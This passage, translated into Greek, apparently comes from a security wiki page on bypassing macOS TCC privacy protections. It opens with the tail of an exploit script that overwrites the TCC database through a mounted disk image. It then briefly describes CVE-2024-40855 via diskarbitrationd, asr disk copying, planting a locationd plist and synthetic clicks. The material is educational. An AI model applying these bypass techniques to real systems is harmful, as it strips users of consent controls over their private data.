os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Ελέγξτε την **πλήρη εκμετάλλευση** στο [**πρωτότυπο άρθρο**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Όπως εξηγήθηκε στο [πρωτότυπο άρθρο](https://www.kandji.io/blog/macos-audit-story-part2), αυτή η CVE εκμεταλλεύτηκε το `diskarbitrationd`.

Η συνάρτηση `DADiskMountWithArgumentsCommon` από το δημόσιο πλαίσιο `DiskArbitration` εκτελούσε τους ελέγχους ασφαλείας. Ωστόσο, είναι δυνατό να παρακαμφθεί καλώντας απευθείας το `diskarbitrationd` και επομένως να χρησιμοποιηθούν στοιχεία `../` στη διαδρομή και symlinks.

Αυτό επέτρεψε σε έναν επιτιθέμενο να κάνει αυθαίρετες τοποθετήσεις σε οποιαδήποτε τοποθεσία, συμπεριλαμβανομένης της βάσης δεδομένων TCC λόγω της εξουσιοδότησης `com.apple.private.security.storage-exempt.heritable` του `diskarbitrationd`.

### asr

Το εργαλείο **`/usr/sbin/asr`** επέτρεπε την αντιγραφή ολόκληρου του δίσκου και την τοποθέτησή του σε άλλη θέση παρακάμπτοντας τις προστασίες TCC.

### Υπηρεσίες Τοποθεσίας

Υπάρχει μια τρίτη βάση δεδομένων TCC στο **`/var/db/locationd/clients.plist`** για να υποδεικνύει τους πελάτες που επιτρέπεται να **έχουν πρόσβαση στις υπηρεσίες τοποθεσίας**.\
Ο φάκελος **`/var/db/locationd/` δεν προστατευόταν από την τοποθέτηση DMG** οπότε ήταν δυνατό να τοποθετήσουμε το δικό μας plist.

## Από εφαρμογές εκκίνησης

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Από grep

Σε πολλές περιπτώσεις, αρχεία θα αποθηκεύουν ευαίσθητες πληροφορίες όπως emails, αριθμούς τηλεφώνων, μηνύματα... σε μη προστατευμένες τοποθεσίες (που μετράνε ως ευπάθεια στην Apple).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Συνθετικά Κλικ

Αυτό δεν λειτουργεί πια, αλλά [**λειτούργησε στο παρελθόν**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Ένας άλλος τρόπος χρησιμοποιώντας [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Αναφορά

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
